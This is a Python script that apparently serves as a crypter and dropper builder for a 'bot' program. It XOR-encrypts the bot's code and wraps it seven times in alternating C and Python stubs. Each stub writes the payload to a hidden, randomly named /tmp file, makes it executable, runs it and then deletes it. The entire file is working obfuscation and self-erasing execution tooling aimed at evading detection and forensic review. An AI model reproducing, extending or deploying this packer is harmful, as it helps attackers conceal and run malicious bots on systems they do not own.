#!/usr/bin/env python

import random
import string
import os

lang_compile = {
    'c' : 'gcc -o {file_path} {file_path}.c'
}

lang_executions = {
    'c' : '{file_path}',
    'py' : 'python {file_path}',
    'pl' : 'perl {file_path}'
}

def gen_rnd_name(): return '.' + ''.join([random.choice(string.ascii_letters) for i in range(32)])
def gen_rnd_xor_key(): return ''.join([chr(random.randrange(0, 256)) for i in range(5)])
def gen_rnd_tmp_name(): return '/tmp/' + gen_rnd_name()

def xor_str(target_str, xor_key): return ''.join([chr(ord(target_str[i])^ord(xor_key[i%len(xor_key)])) for i in range(len(target_str))])
def str_to_byte_arr(target_str): return ','.join([str(hex(ord(c))) for c in target_str])

def get_template(lang):
    template = ''
    with open('templates/' + lang) as read_template: template = read_template.read()
    return template

def def_compile_lang(lang, file_path):
    if lang in lang_compile.keys():
        compile_cmd = lang_compile[lang].format(file_path=file_path)
        os.system(compile_cmd)

def get_lang_execution(lang, file_path):
    lang_exec_cmd = 'chmod +x {file_path} && '.format(file_path=file_path.replace('\x00',''))
    lang_exec_cmd += lang_executions[lang].format(file_path=file_path)
    return lang_exec_cmd

def get_deletion_cmd(file_path):
    deletion_cmd = 'rm -r ' + file_path
    return deletion_cmd

def replace_all_format(target_str, key_name, new_val): return target_str.replace('{'+key_name+'}', new_val)

def gen_bot(bot_lang, target_lang, target_code):
    template = get_template(bot_lang)

    target_path = gen_rnd_tmp_name() + '\x00'
    target_execution = get_lang_execution(target_lang, target_path) + '\x00'
    target_deletion = get_deletion_cmd(target_path)
    xor_key = gen_rnd_xor_key()

    enc_code = xor_str(target_code, xor_key)
    enc_target_path  = xor_str(target_path, xor_key)
    enc_target_execution  = xor_str(target_execution, xor_key)
    enc_target_deletion = xor_str(target_deletion, xor_key)

    template = replace_all_format(template, 'xor_key', str_to_byte_arr(xor_key))
    template = replace_all_format(template, 'enc_code', str_to_byte_arr(enc_code))
    template = replace_all_format(template, 'enc_target_path', str_to_byte_arr(enc_target_path))
    template = replace_all_format(template, 'enc_target_execution', str_to_byte_arr(enc_target_execution))
    template = replace_all_format(template, 'enc_target_deletion', str_to_byte_arr(enc_target_deletion))

    src_name = 'codez' + ('.'+bot_lang if bot_lang in lang_compile.keys() else '')

    with open(src_name, 'wb') as write_code: write_code.write(template)
    def_compile_lang(bot_lang, 'codez')
    code = ''
    with open('codez', 'rb') as read_code: code = read_code.read()
    os.system('rm codez*')

    return code


bot_code = ''
with open('bot.py', 'rb') as read_bot_code: bot_code = read_bot_code.read()

bot = gen_bot('c', 'py', bot_code)

for i in range(3):
    bot = gen_bot('py', 'c', bot)
    bot = gen_bot('c', 'py', bot)

with open('bot', 'wb') as write_bot: write_bot.write(bot)
os.system('chmod +x bot')
